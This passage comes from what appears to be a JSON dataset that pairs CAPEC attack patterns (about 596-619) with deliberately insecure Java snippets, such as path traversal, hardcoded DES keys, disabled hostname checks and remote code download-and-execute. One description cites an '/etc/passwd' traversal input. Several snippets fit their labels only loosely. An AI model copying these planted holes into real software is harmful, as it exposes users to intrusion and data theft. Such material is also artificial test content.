        "description": "This code demonstrates a vulnerable network service that accepts connections on port 8080. It lacks proper source verification, message integrity checks, and authentication mechanisms. The service is susceptible to TCP reset attacks because it doesn't validate connection sources or implement proper session management. Additionally, it's vulnerable to replay attacks due to missing message integrity verification and proper authentication mechanisms. The code also doesn't properly handle multiple socket binds to the same port."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "public class WebClientService {\n    private static final String SERVER_URL = \"http://api.example.com\";\n    \n    public String fetchResource(String resourcePath) {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(SERVER_URL + resourcePath);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            \n            // Vulnerable: No origin verification\n            connection.setRequestProperty(\"Host\", url.getHost());\n            connection.setRequestProperty(\"Connection\", \"keep-alive\");\n            \n            // Vulnerable: No request validation or sanitization\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(connection.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            \n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            \n            return response.toString();\n            \n        } catch (IOException e) {\n            // Vulnerable: Silent failure on TCP RST\n            return null;\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an HTTP client that is susceptible to TCP RST attacks due to improper connection handling and lack of verification. It doesn't verify the source of communication, lacks proper request validation, and doesn't implement protection against request smuggling or replay attacks. The code also fails to properly handle connection resets and doesn't validate HTTP headers, making it vulnerable to header manipulation."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "public class FileAccessServlet extends HttpServlet {\n    private static final String BASE_DIR = \"/var/www/files/\";\n    \n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"filename\");\n        File file = new File(BASE_DIR + fileName);\n        \n        if(file.exists()) {\n            FileInputStream fis = new FileInputStream(file);\n            byte[] data = new byte[(int) file.length()];\n            fis.read(data);\n            fis.close();\n            \n            response.setContentType(\"application/octet-stream\");\n            response.getOutputStream().write(data);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates path traversal by directly concatenating user input to a base directory path without proper validation. An attacker can supply values like '../../../etc/passwd' or absolute paths to access files outside the intended directory. The code fails to sanitize or validate the file path, allowing directory traversal attacks."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "public class DNSResolver {\n    public String resolveAndValidate(String ipAddress) {\n        try {\n            // Vulnerable: relies solely on reverse DNS resolution for security\n            InetAddress addr = InetAddress.getByName(ipAddress);\n            String hostname = addr.getHostName();\n            \n            // Vulnerable: downloads and executes code based on hostname\n            URL url = new URL(\"http://\" + hostname + \"/download/script.jar\");\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{url});\n            Class<?> loadedClass = classLoader.loadClass(\"ScriptToExecute\");\n            Object instance = loadedClass.newInstance();\n            \n            // Vulnerable: performs security critical action based on DNS result\n            if(hostname.endsWith(\".trusted-domain.com\")) {\n                grantAccess(hostname);\n            }\n            \n            return hostname;\n        } catch (Exception e) {\n            return \"Resolution failed\";\n        }\n    }",
        "description": "This vulnerable code performs reverse DNS resolution on an IP address and makes security decisions based on the result. It downloads and executes code from the resolved hostname without proper verification, and is susceptible to DNS spoofing attacks. The code trusts the DNS resolution result for security-critical decisions and fails to implement proper integrity checks on downloaded code."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "public class SatelliteComm {\n    private static final String SATELLITE_ENDPOINT = \"192.168.1.100\";\n    private static final int PORT = 5555;\n    \n    public void transmitSensitiveData(String data) {\n        try {\n            Socket socket = new Socket(SATELLITE_ENDPOINT, PORT);\n            DataOutputStream output = new DataOutputStream(socket.getOutputStream());\n            \n            // Send data without encryption or integrity checks\n            output.writeUTF(data);\n            \n            // No validation of receiver identity\n            output.flush();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public void receiveData() {\n        try {\n            ServerSocket serverSocket = new ServerSocket(PORT);\n            Socket clientSocket = serverSocket.accept();\n            DataInputStream input = new DataInputStream(clientSocket.getInputStream());\n            \n            // Accept data without verifying source or checking for interference\n            String receivedData = input.readUTF();\n            processData(receivedData);\n            \n            serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processData(String data) {\n        // Process received data without validation\n        System.out.println(\"Received: \" + data);\n    }\n}",
        "description": "This vulnerable code demonstrates a satellite communication system that transmits sensitive data without proper encryption, integrity checks, or endpoint validation. It's susceptible to signal jamming and interception due to cleartext transmission and lack of authentication mechanisms. The code doesn't implement any protection against unauthorized signal interference or verification of the communication endpoints, making it vulnerable to man-in-the-middle attacks and signal disruption."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "public class SimpleLoginSystem {\n    private Map<String, String> userCredentials = new HashMap<>();\n\n    public void createAccount(String username, String password) {\n        userCredentials.put(username, password);\n    }\n\n    public boolean authenticate(String username, String password) {\n        String storedPassword = userCredentials.get(username);\n        if (storedPassword != null && storedPassword.equals(password)) {\n            return true;\n        }\n        return false;\n    }\n\n    public void saveCredentials() {\n        try {\n            FileWriter writer = new FileWriter(\"credentials.txt\");\n            for (Map.Entry<String, String> entry : userCredentials.entrySet()) {\n                writer.write(entry.getKey() + \":\" + entry.getValue() + \"\\n\");\n            }\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code implements a basic authentication system that demonstrates multiple security weaknesses: it stores passwords in plain text, uses single-factor authentication, lacks password complexity requirements, has no mechanism for password aging, implements no protection against brute force attempts, and stores credentials in an unencrypted file. The authentication method performs a simple string comparison, making it susceptible to timing attacks and credential stuffing."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "public class VulnerableMessageSystem {\n    private Socket socket;\n    private boolean isAuthenticated = false;\n\n    public void startMessageSystem() throws IOException {\n        ServerSocket serverSocket = new ServerSocket(12345);\n        while (true) {\n            socket = serverSocket.accept();\n            new Thread(() -> {\n                try {\n                    BufferedReader reader = new BufferedReader(\n                        new InputStreamReader(socket.getInputStream()));\n                    String message;\n                    while ((message = reader.readLine()) != null) {\n                        // No message validation or rate limiting\n                        processMessage(message);\n                        // Send response in cleartext\n                        PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);\n                        writer.println(\"SECRET_KEY=12345\");\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }).start();\n        }\n    }\n\n    private void processMessage(String message) {\n        // No endpoint verification\n        // No message integrity check\n        // No rate limiting\n        for(int i = 0; i < message.length() * 100; i++) {\n            // Amplify network traffic for each message\n            broadcastMessage(message);\n        }\n    }\n\n    private void broadcastMessage(String message) {\n        // Send unencrypted messages to all connected clients\n        try {\n            socket.getOutputStream().write(message.getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable message system that processes and broadcasts messages without proper security controls. It exhibits multiple vulnerabilities: lack of message integrity checks, no rate limiting allowing network amplification attacks, no proper endpoint verification, cleartext transmission of sensitive data, and race conditions in threaded message handling. The system can be easily overwhelmed with malicious traffic, leading to denial of service."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "public class LegacyAuthenticator {\n    @Deprecated\n    private boolean authenticateUser(String username) {\n        try {\n            // Using obsolete authentication method\n            String hostName = InetAddress.getByName(username + \".trusted-domain.com\").getHostName();\n            \n            // Using dynamic class loading without verification\n            Class<?> authClass = Class.forName(\"legacy.auth.\" + username + \"Authenticator\");\n            Object authInstance = authClass.newInstance();\n            \n            // Storing credentials in plaintext\n            FileWriter fw = new FileWriter(\"auth.log\", true);\n            fw.write(username + \":authenticated\\n\");\n            fw.close();\n            \n            return hostName.endsWith(\".trusted-domain.com\");\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates multiple deprecated and insecure practices including using obsolete authentication methods, unsafe dynamic class loading, DNS-based security decisions, and unprotected data storage. The code uses deprecated methods, performs unsafe DNS lookups for authentication, implements dynamic class loading without proper verification, and fails to protect stored authentication data."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "public class ResourceManager {\n    private static Map<String, Resource> resources = new HashMap<>();\n\n    public static void allocateResource(String resourceId, int size) {\n        Resource resource = new Resource(size);\n        while (true) {\n            // Continuously allocate memory without any limits\n            resource.data.add(new byte[size * 1024]);\n            resources.put(resourceId, resource);\n        }\n    }\n\n    static class Resource {\n        List<byte[]> data = new ArrayList<>();\n        int size;\n\n        Resource(int size) {\n            this.size = size;\n        }\n    }\n\n    public static void main(String[] args) {\n        // Multiple threads can request resources simultaneously\n        for (int i = 0; i < 100; i++) {\n            new Thread(() -> allocateResource(\"resource\" + System.nanoTime(), 1024)).start();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable resource allocation system that allows unlimited resource consumption without any controls or throttling. It continuously allocates memory in an infinite loop, spawns multiple threads requesting resources simultaneously, and lacks any resource cleanup mechanism. This can lead to resource exhaustion and system failure through memory depletion."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "public class WifiConnection {\n    private Socket wifiSocket;\n    private String accessPointSSID;\n    private boolean isAuthenticated = false;\n\n    public void connect(String ssid, String password) {\n        try {\n            // Vulnerable: No verification of AP authenticity\n            accessPointSSID = ssid;\n            wifiSocket = new Socket(ssid, 80);\n            \n            // Vulnerable: Cleartext transmission\n            String authMessage = \"AUTH:\" + password;\n            wifiSocket.getOutputStream().write(authMessage.getBytes());\n            \n            // Vulnerable: No message integrity check\n            byte[] response = new byte[1024];\n            wifiSocket.getInputStream().read(response);\n            \n            // Vulnerable: Race condition in authentication\n            new Thread(() -> {\n                isAuthenticated = true;\n                processIncomingData();\n            }).start();\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processIncomingData() {\n        while(isAuthenticated) {\n            try {\n                // Vulnerable: No verification of packet source\n                byte[] packet = new byte[1024];\n                wifiSocket.getInputStream().read(packet);\n                // Process packet without validation\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable WiFi connection implementation that's susceptible to deauthentication attacks and channel exploitation. It lacks proper message integrity checks, doesn't verify the authenticity of the access point, transmits sensitive data in cleartext, contains race conditions in authentication, and doesn't verify the source of incoming packets. These vulnerabilities could allow an attacker to perform various WiFi-based attacks including deauthentication flooding and man-in-the-middle attacks."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "public class CellularCommunicator {\n    private Socket channelSocket;\n    private String cellTowerAddress;\n    \n    public void establishConnection(String userDeviceId) {\n        try {\n            // Unprotected channel setup without authentication\n            channelSocket = new Socket(cellTowerAddress, 4444);\n            DataOutputStream output = new DataOutputStream(channelSocket.getOutputStream());\n            \n            // Send device status messages without encryption or integrity checks\n            String statusMessage = \"STATUS:\" + userDeviceId + \":ACTIVE\";\n            output.writeUTF(statusMessage);\n            \n            // Vulnerable signal strength monitoring\n            while(true) {\n                String signalStrength = measureSignalStrength();\n                output.writeUTF(signalStrength);  // Sent in cleartext\n                Thread.sleep(100);  // Predictable timing pattern\n            }\n        } catch(Exception e) {\n            // Silent failure allows connection hijacking\n        }\n    }\n    \n    private String measureSignalStrength() {\n        // Unprotected measurement exposed to interference\n        return \"SIGNAL_STRENGTH:\" + System.currentTimeMillis();\n    }\n}",
        "description": "This code demonstrates multiple cellular communication vulnerabilities including unprotected channel establishment, lack of message integrity checks, cleartext transmission of sensitive data, and susceptibility to signal interference. The code establishes an unauthenticated socket connection and continuously transmits device status messages without encryption or validation, making it vulnerable to jamming attacks and signal manipulation."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "public class InsecureMobileConnection {\n    private static final String HARDCODED_KEY = \"0123456789ABCDEF\";\n    private String encryptionMode = \"A5/1\";\n    \n    public boolean negotiateConnection(String requestedMode) {\n        // Accepts any encryption mode without validation\n        this.encryptionMode = requestedMode;\n        return true;\n    }\n    \n    public byte[] encryptData(byte[] data) {\n        try {\n            // Uses weak encryption (DES) regardless of negotiated mode\n            Cipher cipher = Cipher.getInstance(\"DES/ECB/PKCS5Padding\");\n            SecretKeySpec keySpec = new SecretKeySpec(HARDCODED_KEY.getBytes(), \"DES\");\n            cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n            return cipher.doFinal(data);\n        } catch (Exception e) {\n            return data; // Falls back to unencrypted data on error\n        }\n    }\n    \n    public void sendData(byte[] data, String destination) {\n        byte[] encryptedData = encryptData(data);\n        // Sends data without message integrity check\n        transmitToBaseStation(encryptedData, destination);\n    }\n    \n    private void transmitToBaseStation(byte[] data, String destination) {\n        // Implementation details omitted\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: it allows algorithm downgrade through unvalidated negotiation, uses weak encryption (DES) with a hardcoded key, lacks message integrity verification, and falls back to unencrypted transmission on error. The code accepts any requested encryption mode without validation, making it susceptible to forced downgrade attacks by malicious base stations."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "public class CriticalSystem {\n    private static volatile boolean isProcessing = false;\n    private static int resourceCounter = 0;\n    \n    public static void main(String[] args) {\n        Thread component1 = new Thread(() -> {\n            while(true) {\n                processResource();\n            }\n        });\n        \n        Thread component2 = new Thread(() -> {\n            while(true) {\n                if(isProcessing) {\n                    interruptProcess();\n                }\n            }\n        });\n        \n        component1.start();\n        component2.start();\n    }\n    \n    private static synchronized void processResource() {\n        isProcessing = true;\n        try {\n            resourceCounter++;\n            Thread.sleep(100);  // Simulating processing\n            System.out.println(\"Resource processed: \" + resourceCounter);\n        } catch(InterruptedException e) {\n            // Silently ignore interruption\n        } finally {\n            isProcessing = false;\n        }\n    }\n    \n    private static void interruptProcess() {\n        isProcessing = false;\n        resourceCounter = 0;  // Reset counter without synchronization\n        System.gc();  // Potentially disruptive operation\n    }\n}",
        "description": "This vulnerable code demonstrates system component obstruction through race conditions and improper isolation. It features two threads sharing resources without proper synchronization, allowing for race conditions and state corruption. The interruptProcess method can arbitrarily reset shared state and trigger potentially disruptive operations. The code lacks proper error handling and protection mechanisms, making it susceptible to component interference and system degradation."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "public class WeakCellularEncryption {\n    private static final String HARDCODED_KEY = \"0123456789abcdef\";\n    private static final String WEAK_ALGORITHM = \"DES\";\n    \n    public String negotiateEncryption(String[] supportedAlgorithms) {\n        // Always downgrade to weakest encryption\n        if (Arrays.asList(supportedAlgorithms).contains(\"DES\")) {\n            return \"DES\";\n        }\n        return supportedAlgorithms[0];\n    }\n    \n    public byte[] encryptCellularTraffic(byte[] data) {\n        try {\n            Cipher cipher = Cipher.getInstance(WEAK_ALGORITHM);\n            SecretKeySpec keySpec = new SecretKeySpec(\n                HARDCODED_KEY.getBytes(), WEAK_ALGORITHM);\n            cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n            return cipher.doFinal(data);\n        } catch (Exception e) {\n            return data;\n        }\n    }\n}",
        "description": "This code demonstrates multiple cryptographic vulnerabilities in cellular communications including: use of a weak encryption algorithm (DES), hardcoded encryption key, algorithm downgrade attack vulnerability, and inadequate encryption strength. The code deliberately chooses the weakest available encryption algorithm and uses a fixed key, making it susceptible to cryptanalysis attacks."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "public class UnsecureCellularCommunication {\n    public void sendSensitiveData(String phoneNumber, String message) {\n        // Sending unencrypted data over cellular network\n        CellularConnection conn = new CellularConnection();\n        \n        // No verification of cellular tower authenticity\n        conn.connect();\n        \n        // Using cleartext transmission\n        String userData = \"user_id=12345&password=secret123&message=\" + message;\n        \n        // No message integrity check\n        conn.send(phoneNumber, userData);\n        \n        // Using implicit intent for sensitive data transmission\n        Intent intent = new Intent();\n        intent.setAction(\"com.example.SEND_DATA\");\n        intent.putExtra(\"sensitive_data\", userData);\n        context.sendBroadcast(intent);\n    }\n}",
        "description": "This code demonstrates vulnerable cellular communication by transmitting sensitive data without encryption, lacking tower authentication, using cleartext transmission, omitting message integrity checks, and utilizing implicit intents for sensitive data transmission. It's susceptible to man-in-the-middle attacks and cellular traffic interception."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "public class VulnerableNetworkHandler {\n    private static final String DEBUG_KEY = \"debug123\";\n    private Socket socket;\n    private boolean debugMode = false;\n\n    public void sendSensitiveData(String data, String userCredentials) {\n        try {\n            socket = new Socket(\"remote-server.com\", 8080);\n            String message = String.format(\"data=%s&credentials=%s\", data, userCredentials);\n            \n            if (debugMode) {\n                // Debug mode allows raw data inspection\n                System.out.println(\"DEBUG: \" + message);\n            }\n            \n            // Send data without encryption or integrity checks\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(message);\n            \n            // Allow unlimited message broadcasting\n            for (int i = 0; i < Integer.MAX_VALUE; i++) {\n                out.println(\"PING: \" + message);\n            }\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void enableDebugMode(String key) {\n        // Runtime debug activation\n        if (key.equals(DEBUG_KEY)) {\n            debugMode = true;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: transmission of sensitive data in cleartext, lack of message integrity checks, debug functionality that can be enabled at runtime, potential for network amplification attacks through unlimited message broadcasting, and improper handling of sensitive information in debug output. The code allows an attacker to potentially intercept, modify, and exploit transmitted data while also enabling debug features that could expose sensitive information."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "public class DomainRedirector {\n    private static final String TRUSTED_DOMAIN = \"mybank.com\";\n    \n    public String processRedirect(String userInputDomain) {\n        String redirectUrl = \"https://\" + userInputDomain;\n        \n        // Vulnerable domain validation - only checks if domain ends with trusted domain\n        if(userInputDomain.endsWith(TRUSTED_DOMAIN)) {\n            return redirectUrl + \"?token=\" + generateSessionToken();\n        }\n        \n        // Vulnerable - allows direct GET requests with sensitive data\n        if(userInputDomain.contains(\"api\")) {\n            return redirectUrl + \"?apiKey=secretKey123&userData=\" + getUserData();\n        }\n        \n        // Vulnerable - downloads and executes code without verification\n        if(userInputDomain.contains(\"/resources/\")) {\n            downloadAndExecute(redirectUrl + \"/script.js\");\n        }\n        \n        return redirectUrl;\n    }\n    \n    private void downloadAndExecute(String url) {\n        try {\n            URL scriptUrl = new URL(url);\n            URLConnection conn = scriptUrl.openConnection();\n            // No integrity check performed\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(conn.getInputStream()));\n            // Execute downloaded code\n            ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"javascript\");\n            engine.eval(reader);\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a domain redirect system that fails to properly validate domain names, making it susceptible to bitsquatting attacks. It accepts user input for domain redirection without proper validation, includes sensitive information in GET request parameters, and downloads/executes remote code without integrity checks. The code is vulnerable to domain spoofing where an attacker could register a domain with a single bit difference from the trusted domain and capture traffic, credentials, and sensitive data."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "public class WifiTracker {\n    private Map<String, List<LocationData>> macAddressLog = new HashMap<>();\n    \n    public void logWifiDevice() {\n        try {\n            NetworkInterface networkInterface = NetworkInterface.getByName(\"wlan0\");\n            byte[] mac = networkInterface.getHardwareAddress();\n            String macAddress = String.format(\"%02X:%02X:%02X:%02X:%02X:%02X\", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);\n            \n            // Store MAC address and location in plaintext file without encryption\n            FileWriter writer = new FileWriter(\"wifi_logs.txt\", true);\n            writer.write(macAddress + \",\" + getCurrentLocation() + \",\" + System.currentTimeMillis() + \"\\n\");\n            writer.close();\n            \n            // Store in memory without access control\n            if (!macAddressLog.containsKey(macAddress)) {\n                macAddressLog.put(macAddress, new ArrayList<>());\n            }\n            macAddressLog.get(macAddress).add(new LocationData(getCurrentLocation(), System.currentTimeMillis()));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private String getCurrentLocation() {\n        // Simulate getting current location\n        return \"48.8584,2.2945\";\n    }\n}",
        "description": "This vulnerable code demonstrates passive WiFi tracking by collecting and storing MAC addresses along with location data. It contains multiple security issues: storing sensitive data in plaintext, lack of access control for the logging file, no authentication for data access, and exposure of MAC addresses in system logs. The code stores both in-memory and file-based tracking data without proper protection, making it susceptible to unauthorized access and tracking of users' locations."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "public class WifiManager {\n    private String networkSSID;\n    private String deviceIdentifier;\n\n    public void broadcastWifiBeacon() {\n        // Broadcast WiFi management frames with SSID in plaintext\n        byte[] beaconFrame = createBeaconFrame(networkSSID);\n        sendWifiFrame(beaconFrame);\n    }\n\n    public void connectToNetwork(String ssid) {\n        // Send probe request with SSID in plaintext\n        byte[] probeRequest = createProbeRequest(ssid, deviceIdentifier);\n        sendWifiFrame(probeRequest);\n    }\n\n    private byte[] createBeaconFrame(String ssid) {\n        // Create management frame with SSID in clear text\n        return ssid.getBytes();\n    }\n\n    private void sendWifiFrame(byte[] frame) {\n        // Send unencrypted management frame over wireless channel\n        WifiTransmitter.send(frame);\n    }\n}",
        "description": "This code demonstrates vulnerable WiFi management frame handling where the SSID is transmitted in plaintext through beacon frames and probe requests. The code does not implement any encryption or obfuscation of the SSID, making it easily interceptable by passive listeners. It also includes device identifiers in probe requests, allowing for potential device tracking. The lack of channel security and proper identifier protection makes it susceptible to unauthorized monitoring and user tracking."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "public class SimCardUpdate {\n    private static final String DES_KEY = \"abc123\";  // Weak DES key\n    \n    public void processOTAUpdate(byte[] smsData) {\n        try {\n            Cipher cipher = Cipher.getInstance(\"DES/ECB/NoPadding\");  // Weak DES encryption\n            SecretKeySpec keySpec = new SecretKeySpec(DES_KEY.getBytes(), \"DES\");\n            cipher.init(Cipher.DECRYPT_MODE, keySpec);\n            \n            byte[] decryptedData = cipher.doFinal(smsData);\n            JavaApplet applet = loadApplet(decryptedData);\n            \n            // No authentication check before executing applet\n            applet.execute();\n            \n            // Update SIM card settings without verification\n            updateSimSettings(applet.getCommands());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void updateSimSettings(String[] commands) {\n        for(String cmd : commands) {\n            // Direct execution of commands without validation\n            executeSimCommand(cmd);\n        }\n    }\n    \n    private void executeSimCommand(String command) {\n        // Unrestricted access to sensitive SIM functions\n        if(command.startsWith(\"SMS\")) {\n            sendSMS(command);\n        } else if(command.startsWith(\"LOCATION\")) {\n            getLocation();\n        } else if(command.startsWith(\"VOICEMAIL\")) {\n            updateVoicemail(command);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a SIM card OTA update system using weak DES encryption, lacking proper authentication and access controls. It allows arbitrary execution of Java applets received via SMS, enabling unauthorized access to sensitive SIM card functions including SMS sending, location querying, and voicemail settings modification. The code uses a hardcoded DES key, implements no firmware update verification, and provides unrestricted access to internal SIM card commands."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "public class UnsecureWiFiConnection {\n    private Socket clientSocket;\n    private PrintWriter out;\n    private BufferedReader in;\n\n    public void connectToNetwork(String ssid) {\n        try {\n            // Automatically connect to any available WiFi network with matching SSID\n            // No verification of network authenticity\n            clientSocket = new Socket(\"wifi-access-point\", 8080);\n            out = new PrintWriter(clientSocket.getOutputStream(), true);\n            in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n\n            // Send sensitive data in cleartext\n            String username = \"admin\";\n            String password = \"secretpass123\";\n            String message = \"LOGIN:\" + username + \":\" + password;\n            out.println(message);\n\n            // Receive data without verifying source or checking message integrity\n            String response = in.readLine();\n            processResponse(response);\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processResponse(String response) {\n        // Process response without validating its authenticity\n        System.out.println(\"Received: \" + response);\n    }\n}",
        "description": "This code demonstrates several security vulnerabilities related to insecure WiFi connections. It connects to a network without verifying the authenticity of the access point, transmits sensitive credentials in cleartext, and processes received data without verifying the source or checking message integrity. This makes it susceptible to evil twin attacks and man-in-the-middle attacks."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "public class ResourceLoader {\n    private static final String EXPECTED_BASE_URL = \"https://legitimate-server.com/resources/\";\n    \n    public static byte[] loadResource(String resourcePath) {\n        try {\n            String fullPath = resourcePath.startsWith(\"http\") ? \n                             resourcePath : \n                             EXPECTED_BASE_URL + resourcePath;\n            \n            URL url = new URL(fullPath);\n            URLConnection conn = url.openConnection();\n            \n            // No validation of SSL certificate or hostname\n            if (conn instanceof HttpsURLConnection) {\n                ((HttpsURLConnection) conn).setHostnameVerifier((hostname, session) -> true);\n            }\n            \n            try (InputStream in = conn.getInputStream()) {\n                return in.readAllBytes();\n            }\n        } catch (Exception e) {\n            return null;\n        }\n    }\n    \n    public static void main(String[] args) {\n        // Vulnerable usage example\n        String userProvidedPath = args[0];\n        byte[] resource = loadResource(userProvidedPath);\n        processResource(resource);\n    }\n    \n    private static void processResource(byte[] resource) {\n        // Process the potentially malicious resource\n    }\n}",
        "description": "This code is vulnerable to resource location spoofing as it allows loading resources from any URL without proper validation. It accepts user input for resource paths, doesn't validate the source, disables SSL verification, and blindly trusts the input source. An attacker could provide a malicious URL that mimics the legitimate resource location to serve harmful content."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "public class CellularConnection {\n    private Socket socket;\n    private String baseStationId;\n\n    public void connectToStrongestSignal() {\n        try {\n            // Connect to whatever base station has strongest signal without verification\n            BaseStation station = findStrongestSignal();\n            baseStationId = station.getId();\n            \n            // No authentication or validation of base station identity\n            socket = new Socket(station.getHostname(), station.getPort());\n            \n            // Send sensitive data without verifying channel integrity\n            DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n            out.writeUTF(\"IMEI:\" + getDeviceImei());\n            out.writeUTF(\"KEY:\" + getSecretKey());\n            \n            // No message integrity checks on received data\n            DataInputStream in = new DataInputStream(socket.getInputStream());\n            String response = in.readUTF();\n            processResponse(response);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private BaseStation findStrongestSignal() {\n        // Simply returns first available signal without verification\n        return BaseStation.scanForSignals().get(0);\n    }\n}",
        "description": "This vulnerable code demonstrates a cellular device connecting to a base station solely based on signal strength, without proper verification of the base station's identity or message integrity. It lacks authentication mechanisms, channel security validation, and proper endpoint verification, making it susceptible to rogue base station attacks. The code sends sensitive device information (IMEI and secret key) over an unverified channel and processes responses without integrity checks."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "public class LocationTracker {\n    private String phoneNumber;\n    private String simId;\n    private Context context;\n\n    public LocationTracker(Context context, String targetPhoneNumber) {\n        this.context = context;\n        this.phoneNumber = targetPhoneNumber;\n    }\n\n    public void trackUserLocation() {\n        Intent broadcastIntent = new Intent();\n        broadcastIntent.setAction(\"com.carrier.SEND_ALERT\");\n        broadcastIntent.putExtra(\"phone_number\", phoneNumber);\n        broadcastIntent.putExtra(\"message\", \"LOCATION_CHECK\");\n\n        // Sending broadcast without proper verification\n        context.sendBroadcast(broadcastIntent);\n\n        BroadcastReceiver receiver = new BroadcastReceiver() {\n            @Override\n            public void onReceive(Context context, Intent intent) {\n                String lac = intent.getStringExtra(\"location_area_code\");\n                // Storing location data without proper validation\n                sendLocationToServer(lac, phoneNumber);\n            }\n        };\n\n        context.registerReceiver(receiver, new IntentFilter(\"com.carrier.LOCATION_RESPONSE\"));\n    }\n\n    private void sendLocationToServer(String lac, String phone) {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(\"http://tracking-server.com/update\");\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            // Sending sensitive data over insecure channel\n            String data = \"lac=\" + lac + \"&phone=\" + phone;\n            connection.getOutputStream().write(data.getBytes());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a location tracking system that uses cellular broadcast messages to determine a target's location. It includes multiple vulnerabilities: using implicit intents for sensitive communication, transmitting sensitive data (phone number and location) without proper encryption, lack of proper verification of message sources, and insufficient channel security. The code sends broadcast messages and listens for responses without proper authentication or message integrity checks."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
